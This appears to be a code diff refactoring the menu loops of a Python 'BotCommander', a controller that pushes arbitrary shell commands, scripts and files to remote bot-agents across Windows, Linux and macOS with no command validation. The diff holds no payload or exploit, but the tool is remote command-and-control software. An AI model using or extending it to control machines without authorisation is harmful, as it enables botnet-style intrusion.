@@ -61,6 +61,7 @@ class BotCommander:
         4) Generic command - command that can be processed by both Windows and Linux OS
         NOTE: If you choose 3 the command will be sent to all online bot-agents, if not it will be sent
         only to those online bot-agents running on the chosen OS type command
+        5) Go back to previous menu
         """)
 
     @staticmethod
@@ -68,8 +69,8 @@ class BotCommander:
         return input(f"{message}")
 
     async def __process_user_input(self):
-        self.__print_help()
         while True:
+            self.__print_help()
             val = 0
             msg = "Please insert a digit corresponding to one of the available options, 1, 2, 3, 4 or 5: "
             choice = await asyncio.get_running_loop().run_in_executor(None, self.__get_user_input, msg)
@@ -82,7 +83,6 @@ class BotCommander:
                       f" This is the error: {err}")
             match val:
                 case 1:
-                    self.__print_cmd_options()
                     await self.__exec_shell_cmd()
                 case 2:
                     self.__exec_python_script()
@@ -96,41 +96,56 @@ class BotCommander:
                     print("Please insert a digit corresponding to one of the available options, 1, 2, 3, 4 or 5")
 
     async def __exec_shell_cmd(self):
-        msg = "Please insert a digit corresponding to one of the available options, 1, 2, 3 or 4: "
-        choice = await asyncio.get_running_loop().run_in_executor(None, self.__get_user_input, msg)
-        try:
-            val = int(choice)
-        except ValueError:
-            print("You have not inserted a digit, please insert a digit.")
-            await self.__exec_shell_cmd()
-        except Exception as err:
-            print(f"An unexpected exception occurred while processing your choice. Please retry and insert a digit."
-                  f" This is the error: {err}")
-            await self.__exec_shell_cmd()
-        match val:
-            case 1:
-                cmd_filter = "Windows"
-            case 2:
-                cmd_filter = "Linux"
-            case 3:
-                cmd_filter = "Darwin"
-            case 4:
-                cmd_filter = ""
-            case _:
-                print("Please insert a digit corresponding to one of the available options, 1, 2, 3 or 4")
-                self.__print_cmd_options()
-                await self.__exec_shell_cmd()
-        print("NOTE: There is no validation performed by commander in regards to your command, so insert a valid one,"
-              " if you insert an invalid one however you will just get the output and error for that command sent"
-              "back by bot-agent, this note is just FYI.")
-        msg = "Please insert the command you want to send to bot-agents: "
-        cmd = await asyncio.get_running_loop().run_in_executor(None, self.__get_user_input, msg)
-        if cmd:
-            await self.__schedule_command(cmd, cmd_filter)
-        else:
-            print("You need to insert something. Starting over")
+        while True:
             self.__print_cmd_options()
-            await self.__exec_shell_cmd()
+            msg = "Please insert a digit corresponding to one of the available options, 1, 2, 3 or 4: "
+            choice = await asyncio.get_running_loop().run_in_executor(None, self.__get_user_input, msg)
+            try:
+                val = int(choice)
+            except ValueError:
+                print("You have not inserted a digit, please insert a digit.")
+                await self.__exec_shell_cmd()
+            except Exception as err:
+                print(f"An unexpected exception occurred while processing your choice. Please retry and insert a digit."
+                      f" This is the error: {err}")
+                await self.__exec_shell_cmd()
+            match val:
+                case 1:
+                    cmd_filter = "Windows"
+                case 2:
+                    cmd_filter = "Linux"
+                case 3:
+                    cmd_filter = "Darwin"
+                case 4:
+                    cmd_filter = ""
+                case 5:
+                    break
+                case _:
+                    print("Please insert a digit corresponding to one of the available options, 1, 2, 3 or 4")
+                    self.__print_cmd_options()
+                    await self.__exec_shell_cmd()
+            print("NOTE: There is no validation performed by commander in regards to your command, so insert a valid "
+                  "one, if you insert an invalid one however you will just get the output and error for that command"
+                  " sent back by bot-agent, this note is just FYI.")
+            while True:
+                msg = "Please insert the command you want to send to bot-agents: "
+                cmd = await asyncio.get_running_loop().run_in_executor(None, self.__get_user_input, msg)
+                if cmd:
+                    await self.__schedule_command(cmd, cmd_filter)
+                    msg = "Do you wish to run another command using the same filter? Y/N: "
+                    choice = await asyncio.get_running_loop().run_in_executor(None, self.__get_user_input, msg)
+                    match choice:
+                        case "Y":
+                            continue
+                        case "N":
+                            break
+                        case _:
+                            print("The only supported inputs are Y and N, please make sure you use one of them ...")
+                            break
+                else:
+                    print("You need to insert something. Starting over")
+                    self.__print_cmd_options()
+                    await self.__exec_shell_cmd()
 
     async def __schedule_command(self, cmd, cmd_filter):
         payload = self.__json_builder("exeCommand", cmd)
@@ -288,9 +303,6 @@ class BotCommander:
                 else:
                     return False
             case "exeCommandReply":
-                command = json_msg.get("command")
-                response = json_msg.get("result")
-                print(f"Response from bot-agent {addr} for command {command} is: {response}")
                 return True
             case "putFileReply":
                 pass
@@ -323,7 +335,7 @@ class BotCommander:
         if message in ["botHostInfoReply", "botHelloReply"]:
             d = {"message": f"{message}"}
         elif message == "exeCommand":
-            cmd = args
+            cmd, = args
             d = {"message": f"{message}", "command": cmd}
         elif message == "exePythonScript":
             path_to_script = args
